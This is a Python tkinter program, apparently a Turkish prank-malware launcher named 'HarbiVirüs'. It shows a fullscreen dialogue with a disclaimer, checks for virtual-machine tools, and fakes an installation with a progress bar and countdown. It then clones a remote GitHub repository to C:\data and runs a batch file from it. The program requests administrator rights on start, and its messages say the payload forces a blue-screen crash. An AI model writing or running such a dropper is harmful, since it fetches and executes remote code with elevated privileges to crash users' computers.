import tkinter as tk
import sys
import platform
import time
from tkinter import ttk
import threading
import socket
import os
import ctypes
import subprocess

class AnimatedTextApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Unknown Destroyer")
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='black')
        
        self.main_frame = tk.Frame(self.root, bg='black')
        self.main_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        self.text_label = tk.Label(
            self.main_frame,
            text="",
            font=("Courier", 14),
            fg="#00ff00",
            bg='black',
            justify=tk.LEFT
        )
        self.text_label.pack(pady=20)
        
        self.input_frame = tk.Frame(self.main_frame, bg='black')
        self.input_frame.pack(pady=10)
        
        self.input_entry = tk.Entry(
            self.input_frame,
            font=("Courier", 12),
            bg='black',
            fg="#00ff00",
            insertbackground="#00ff00",
            width=40
        )
        
        self.countdown_label = tk.Label(
            self.main_frame,
            text="",
            font=("Courier", 72, "bold"),
            fg="#ff0000",
            bg='black'
        )
        
        self.computer_name = platform.node()
        self.user_name = ""
        self.messages = []
        self.current_step = 0
        
    def fade_in(self, widget, duration=1.0):
        alpha = 0.0
        widget.pack()
        
        def update_alpha():
            nonlocal alpha
            if alpha < 1.0:
                alpha += 0.05
                widget.configure(fg=f"#{int(alpha * 255):02x}ff00")
                self.root.after(50, update_alpha)
        
        update_alpha()
        
    def fade_out(self, widget, duration=1.0, callback=None):
        alpha = 1.0
        
        def update_alpha():
            nonlocal alpha
            if alpha > 0:
                alpha -= 0.05
                widget.configure(fg=f"#{int(alpha * 255):02x}ff00")
                self.root.after(50, update_alpha)
            else:
                widget.pack_forget()
                if callback:
                    callback()
        
        update_alpha()

    def show_input(self, prompt, callback):
        self.input_entry.delete(0, tk.END)
        prompt_label = tk.Label(
            self.input_frame,
            text=prompt,
            font=("Courier", 12),
            fg="#00ff00",
            bg='black'
        )
        prompt_label.pack(side=tk.LEFT, padx=5)
        self.input_entry.pack(side=tk.LEFT)
        
        def handle_enter(event):
            value = self.input_entry.get()
            self.input_entry.pack_forget()
            prompt_label.pack_forget()
            callback(value)
            
        self.input_entry.bind('<Return>', handle_enter)
        self.fade_in(self.input_frame)
        self.input_entry.focus()

    def start_sequence(self):
        messages = [
            f"Merhaba, {self.computer_name}",
            f"Beni başlattığına göre, kendine fazla güveniyorsun, {self.computer_name}",
            "Tanışmak istermisin? Ben senin ismini zaten biliyorum ama neyse."
        ]
        
        def ask_name():
            def after_name(name):
                self.user_name = name
                self.show_next_messages()
            self.show_input("İsminiz nedir?", after_name)
            
        def show_message(index):
            if index < len(messages):
                self.text_label.configure(text=messages[index])
                self.fade_in(self.text_label)
                self.root.after(3000, lambda: self.fade_out(self.text_label, callback=lambda: show_message(index + 1)))
            else:
                ask_name()
                
        show_message(0)
        
    def show_next_messages(self):
        messages = [
            f"Tanıştığıma memnun oldum, {self.user_name}, Benim ismim \"Unknown Destroyer\", "
            "ve şu anda başlattığın virüsün yani HarbiVirüs'ün yapımcısıyım.",
            "Şimdi başlamadan önce anlaşmayı kabul etmen gerek. Çünkü hiçbir sorumluluk benim umrumda değil.",
            """Bu programı başlatırken, kabul ettiğin şeyler bunlardır:
1. Virüsü izinsiz ve başka bir sistemde çalıştırmak yasaktır.
2. Unknown Destroyer'ın bu uygulama ile yasal sorumluluk kabul etmediğini,
3. Bu programı intikam için başka bir cihaz'da çalıştırmadığını,
4. Bu virüsün bilgisayara verebileceği zararın Unknown Destroyer ile alakalı olmadığı ve 
   yasal/maddi sorumluluk kabul etmediğiniz kabul etmiş olursun.""",
            "Eğer anlaşmayı kabul etmiyorsun uza burdan.",
            "Peki, size sosyal medya adreslerimin reklamını yapabilirmiyim?"
        ]
        
        def show_ads_prompt():
            def handle_ads_response(response):
                if response.lower() == "evet":
                    self.text_label.configure(text="""Social Media:
tiktok.com/@unknown_napim
youtube.com/@samhordesongs""")
                    self.fade_in(self.text_label)
                    self.root.after(3000, self.show_final_messages)
                else:
                    self.text_label.configure(text="Kusura bakmayın.")
                    self.fade_in(self.text_label)
                    self.root.after(2000, self.show_final_messages)
                    
            self.show_input("Reklam yapabilirmiyim? (evet/hayır)", handle_ads_response)
            
        def show_message(index):
            if index < len(messages):
                self.text_label.configure(text=messages[index])
                self.fade_in(self.text_label)
                self.root.after(4000, lambda: self.fade_out(self.text_label, callback=lambda: show_message(index + 1)))
            else:
                show_ads_prompt()
                
        show_message(0)
        
    def show_final_messages(self):
        is_vm = self.check_if_vm()
        messages = [
            "Bu virüs, çalıştıktan toplam 150 saniye sonra bilgisayarı zorla mavi ekran verdircek. "
            "Yani bilgisayarı yeniden başlatmanız gerekicek."
        ]
        
        if is_vm:
            messages.append("Tabi senin buna ihtiyacın yok, çünkü büyük ihtimalle VM tuşuna basıp "
                          "sadece Reset'e bascaksın ve oldu bitti diyeceksin.")
            messages.append("Şu an sanal makinede olduğumun farkındayım. Haberin olsun, "
                          "ben senin ana bilgisayarına sıçramam. (istersem yapabilirim ama neyse).")
            
        messages.append("O zaman virüsü yüklemek istermisin?")
        
        def handle_install_response(response):
            if response.lower() == "evet":
                self.start_installation()
            else:
                self.root.quit()
                
        def show_message(index):
            if index < len(messages):
                self.text_label.configure(text=messages[index])
                self.fade_in(self.text_label)
                self.root.after(4000, lambda: self.fade_out(self.text_label, callback=lambda: show_message(index + 1)))
            else:
                self.show_input("Yüklemek istermisin? (evet/hayır)", handle_install_response)
                
        show_message(0)
        
    def check_if_vm(self):
        common_vm_processes = ['vboxservice.exe', 'vmtoolsd.exe']
        return any(proc in os.popen('tasklist').read().lower() for proc in common_vm_processes)
        
    def start_installation(self):
        progress_var = tk.DoubleVar()
        progress_bar = ttk.Progressbar(
            self.main_frame,
            variable=progress_var,
            maximum=100
        )
        progress_bar.pack(pady=20)
        
        def update_progress(value):
            progress_var.set(value)
            self.text_label.configure(text=f"Yükleniyor - {value}%\n[{'#' * int(value/2.5)}]")
            
        def installation_complete():
            progress_bar.pack_forget()
            self.show_input("Başlatmak istermisin? (evet/hayır)", self.handle_final_response)
            
        def progress_simulation():
            for i in range(101):
                self.root.after(i * 50, lambda v=i: update_progress(v))
            self.root.after(5100, installation_complete)
            
        threading.Thread(target=progress_simulation).start()

    def show_dots(self):
        def show_dot_sequence(count):
            if count <= 10:
                self.text_label.configure(text="." * count)
                self.fade_in(self.text_label)
                self.root.after(500, lambda: self.fade_out(self.text_label, 
                    callback=lambda: show_dot_sequence(count + 1)))
            else:
                self.text_label.configure(text="O zaman başlayalım.")
                self.fade_in(self.text_label)
                self.root.after(2000, self.start_countdown)
        
        show_dot_sequence(1)

    def start_countdown(self):
        def update_count(count):
            if count >= 0:
                self.countdown_label.configure(text=str(count))
                self.countdown_label.pack(expand=True)
                self.root.after(1000, lambda: update_count(count - 1))
            else:
                self.countdown_label.pack_forget()
                self.execute_virus()
        
        update_count(20)

    def execute_virus(self):
        try:
            # Create data directory if it doesn't exist
            os.makedirs("C:\\data", exist_ok=True)
            
            # Clone repository and move files
            subprocess.run([
                "git", "clone", "https://github.com/Unknowndestroy/HarbiVirus",
                "C:\\data\\HarbiVirus"
            ])
            
            # Execute the virus
            subprocess.Popen(
                ["C:\\data\\HarbiVirus\\HarbiVirus.bat"],
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            
        except Exception as e:
            print(f"Error executing virus: {e}")
        finally:
            self.root.quit()
        
    def handle_final_response(self, response):
        if response.lower() == "evet":
            self.text_label.configure(text="Hazırmısın?")
            self.fade_in(self.text_label)
            self.root.after(2000, self.show_dots)
        else:
            self.root.quit()
            
    def run(self):
        self.start_sequence()
        self.root.mainloop()

if __name__ == "__main__":
    if os.name == 'nt':  # Windows
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
    
    app = AnimatedTextApp()
    app.run()
